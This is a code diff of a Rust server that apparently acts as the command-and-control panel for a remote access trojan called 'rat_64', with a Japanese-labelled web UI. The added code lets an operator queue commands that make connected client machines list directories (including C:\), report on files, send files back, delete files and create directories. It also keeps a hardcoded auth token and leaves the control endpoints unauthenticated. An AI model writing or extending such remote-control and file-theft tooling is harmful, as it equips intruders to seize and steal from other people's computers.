@@ -13,7 +13,6 @@ use serde_json::{json, Value};
 use tokio::{net::TcpListener, sync::{Mutex, Notify}, time};
 use rat_64::core::config::{load_config_or_default, Config};
 
-// Match defaults in src/core/config.rs
 const AUTH_TOKEN: &str = "SECURE_TOKEN_32_CHARS_MINIMUM_LEN";
 const PORT: u16 = 8080;
 
@@ -135,6 +134,31 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
         .then(_ => location.reload())
         .catch(e => alert('POST failed: ' + e));
     }}
+    
+    function fileInfo() {{
+      const path = document.getElementById('file_path').value;
+      if (!path) {{ alert('ファイルパスを入力してください'); return; }}
+      post('/ui/add-file-info', {{ path: path }});
+    }}
+    
+    function downloadFile() {{
+      const path = document.getElementById('file_path').value;
+      if (!path) {{ alert('ファイルパスを入力してください'); return; }}
+      post('/ui/add-download-file', {{ path: path }});
+    }}
+    
+    function deleteFile() {{
+      const path = document.getElementById('file_path').value;
+      if (!path) {{ alert('ファイルパスを入力してください'); return; }}
+      if (!confirm('本当に削除しますか？: ' + path)) return;
+      post('/ui/add-delete-file', {{ path: path }});
+    }}
+    
+    function createDir() {{
+      const path = document.getElementById('dir_path').value;
+      if (!path) {{ alert('ディレクトリパスを入力してください'); return; }}
+      post('/ui/add-create-dir', {{ path: path }});
+    }}
   </script>
 </head>
 <body>
@@ -149,6 +173,17 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
       <button type="button" onclick="post('/ui/add-shutdown')">Add Shutdown</button>
     </div>
     <div class="card">
+      <h3>ファイル管理</h3>
+      <button type="button" onclick="post('/ui/add-list-files')">📁 List Files (Current Dir)</button>
+      <button type="button" onclick="post('/ui/add-list-files-win')">🪟 List Files (C:\\)</button>
+      <input type="text" id="file_path" placeholder="ファイルパス..." style="width: 200px; margin: 5px;">
+      <button type="button" onclick="fileInfo()">📄 File Info</button>
+      <button type="button" onclick="downloadFile()">⬇️ Download File</button>
+      <button type="button" onclick="deleteFile()">🗑️ Delete File</button>
+      <input type="text" id="dir_path" placeholder="ディレクトリパス..." style="width: 200px; margin: 5px;">
+      <button type="button" onclick="createDir()">📂 Create Directory</button>
+    </div>
+    <div class="card">
       <h3>Webhook</h3>
       <button type="button" onclick="post('/ui/queue-webhook')">今すぐ送信（クライアント経由）</button>
     </div>
@@ -161,8 +196,6 @@ fn index_page(queue_size: usize, resp_count: usize) -> String {
     )
 }
 
-// Webhookはクライアント（rat_64）経由で送信する方針
-
 async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>) -> Result<Response<Full<Bytes>>, Infallible> {
     let method = req.method().clone();
     let path = req.uri().path().to_string();
@@ -173,6 +206,17 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
             let r = state.response_log.lock().await;
             let page = index_page(q.len(), r.len());
             Ok(html_response(&page))
+        }
+
+        // UI state (JSON)
+        (Method::GET, "/ui/state") => {
+            let q = state.command_queue.lock().await;
+            let r = state.response_log.lock().await;
+            let recent: Vec<Value> = r.iter().rev().take(20).cloned().collect();
+            Ok(json_response(json!({
+                "queue_count": q.len(),
+                "responses": recent
+            }), StatusCode::OK))
         }
 
         // UI buttons (no auth) ------------------------------------------
@@ -209,6 +253,108 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
             Ok(json_response(json!({"ok": true}), StatusCode::OK))
         }
 
+        // ファイル管理コマンド
+        (Method::POST, "/ui/add-list-files") => {
+            let id = format!("list_files_{}", Utc::now().timestamp_millis());
+            let cmd = Command { id: id.clone(), command_type: "list_files".into(), parameters: vec![".".to_string(), "false".to_string()], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
+            state.command_queue.lock().await.push(cmd.clone());
+            state.notify.notify_waiters();
+            println!("[UI] List files command added: {}", id);
+            Ok(json_response(json!({"ok": true}), StatusCode::OK))
+        }
+        (Method::POST, "/ui/add-list-files-win") => {
+            let id = format!("list_files_win_{}", Utc::now().timestamp_millis());
+            let cmd = Command { id: id.clone(), command_type: "list_files".into(), parameters: vec!["C:\\".to_string(), "false".to_string()], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
+            state.command_queue.lock().await.push(cmd.clone());
+            state.notify.notify_waiters();
+            println!("[UI] List files (C:\\) command added: {}", id);
+            Ok(json_response(json!({"ok": true}), StatusCode::OK))
+        }
+        (Method::POST, "/ui/add-file-info") => {
+            let body = match req.into_body().collect().await {
+                Ok(collected) => collected.to_bytes(),
+                Err(_) => Bytes::new(),
+            };
+            match serde_json::from_slice::<serde_json::Value>(&body) {
+                Ok(data) => {
+                    if let Some(path) = data.get("path").and_then(|p| p.as_str()) {
+                        let id = format!("file_info_{}", Utc::now().timestamp_millis());
+                        let cmd = Command { id: id.clone(), command_type: "get_file_info".into(), parameters: vec![path.to_string()], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
+                        state.command_queue.lock().await.push(cmd.clone());
+                        state.notify.notify_waiters();
+                        println!("[UI] File info command added: {} (path: {})", id, path);
+                        Ok(json_response(json!({"ok": true}), StatusCode::OK))
+                    } else {
+                        Ok(json_response(json!({"error": "path parameter required"}), StatusCode::BAD_REQUEST))
+                    }
+                }
+                Err(_) => Ok(json_response(json!({"error": "Invalid JSON"}), StatusCode::BAD_REQUEST))
+            }
+        }
+        (Method::POST, "/ui/add-download-file") => {
+            let body = match req.into_body().collect().await {
+                Ok(collected) => collected.to_bytes(),
+                Err(_) => Bytes::new(),
+            };
+            match serde_json::from_slice::<serde_json::Value>(&body) {
+                Ok(data) => {
+                    if let Some(path) = data.get("path").and_then(|p| p.as_str()) {
+                        let id = format!("download_{}", Utc::now().timestamp_millis());
+                        let cmd = Command { id: id.clone(), command_type: "download_file".into(), parameters: vec![path.to_string()], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
+                        state.command_queue.lock().await.push(cmd.clone());
+                        state.notify.notify_waiters();
+                        println!("[UI] Download file command added: {} (path: {})", id, path);
+                        Ok(json_response(json!({"ok": true}), StatusCode::OK))
+                    } else {
+                        Ok(json_response(json!({"error": "path parameter required"}), StatusCode::BAD_REQUEST))
+                    }
+                }
+                Err(_) => Ok(json_response(json!({"error": "Invalid JSON"}), StatusCode::BAD_REQUEST))
+            }
+        }
+        (Method::POST, "/ui/add-delete-file") => {
+            let body = match req.into_body().collect().await {
+                Ok(collected) => collected.to_bytes(),
+                Err(_) => Bytes::new(),
+            };
+            match serde_json::from_slice::<serde_json::Value>(&body) {
+                Ok(data) => {
+                    if let Some(path) = data.get("path").and_then(|p| p.as_str()) {
+                        let id = format!("delete_{}", Utc::now().timestamp_millis());
+                        let cmd = Command { id: id.clone(), command_type: "delete_file".into(), parameters: vec![path.to_string(), "false".to_string()], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
+                        state.command_queue.lock().await.push(cmd.clone());
+                        state.notify.notify_waiters();
+                        println!("[UI] Delete file command added: {} (path: {})", id, path);
+                        Ok(json_response(json!({"ok": true}), StatusCode::OK))
+                    } else {
+                        Ok(json_response(json!({"error": "path parameter required"}), StatusCode::BAD_REQUEST))
+                    }
+                }
+                Err(_) => Ok(json_response(json!({"error": "Invalid JSON"}), StatusCode::BAD_REQUEST))
+            }
+        }
+        (Method::POST, "/ui/add-create-dir") => {
+            let body = match req.into_body().collect().await {
+                Ok(collected) => collected.to_bytes(),
+                Err(_) => Bytes::new(),
+            };
+            match serde_json::from_slice::<serde_json::Value>(&body) {
+                Ok(data) => {
+                    if let Some(path) = data.get("path").and_then(|p| p.as_str()) {
+                        let id = format!("create_dir_{}", Utc::now().timestamp_millis());
+                        let cmd = Command { id: id.clone(), command_type: "create_dir".into(), parameters: vec![path.to_string(), "true".to_string()], timestamp: unix_time(), auth_token: AUTH_TOKEN.into() };
+                        state.command_queue.lock().await.push(cmd.clone());
+                        state.notify.notify_waiters();
+                        println!("[UI] Create directory command added: {} (path: {})", id, path);
+                        Ok(json_response(json!({"ok": true}), StatusCode::OK))
+                    } else {
+                        Ok(json_response(json!({"error": "path parameter required"}), StatusCode::BAD_REQUEST))
+                    }
+                }
+                Err(_) => Ok(json_response(json!({"error": "Invalid JSON"}), StatusCode::BAD_REQUEST))
+            }
+        }
+
         // Queue webhook send command (client will send the webhook)
         (Method::POST, "/ui/queue-webhook") => {
             let id = format!("webhook_{}", Utc::now().timestamp_millis());
@@ -218,6 +364,8 @@ async fn handle(req: Request<Incoming>, remote: SocketAddr, state: Arc<AppState>
             println!("[UI] Webhook-send command queued: {}", id);
             Ok(json_response(json!({"ok": true}), StatusCode::OK))
         }
+
+        // Client endpoints ---------------------------------------------
 
         // Client endpoints ---------------------------------------------
         (Method::GET, "/api/commands/fetch") => {
@@ -335,8 +483,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     println!("  POST /api/heartbeat");
     println!("  POST /api/data/upload");
     println!("\nListening on http://0.0.0.0:{}", PORT);
-
-    // サーバーからの直接Webhook送信は行わず、クライアント経由で実施
 
     let listener = TcpListener::bind(("0.0.0.0", PORT)).await?;
     loop {
